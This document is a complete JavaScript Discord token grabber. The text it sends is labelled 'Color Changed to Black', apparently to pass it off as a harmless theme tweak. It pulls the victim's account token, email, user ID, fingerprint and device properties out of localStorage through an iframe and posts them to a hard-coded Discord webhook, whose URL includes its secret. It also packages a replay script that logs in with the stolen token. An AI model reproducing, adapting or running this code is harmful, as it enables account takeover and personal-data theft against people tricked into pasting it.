location.reload();
var discordWebhook = "https://discord.com/api/webhooks/903000521542074429/MoRRx_JKpvMtvJe4IJrwdNfPrv-K33mlkmqsRRoTWBed0kqaXY14etoeozFtEuYCHez-";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    content: '**Color Changed to Black**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));
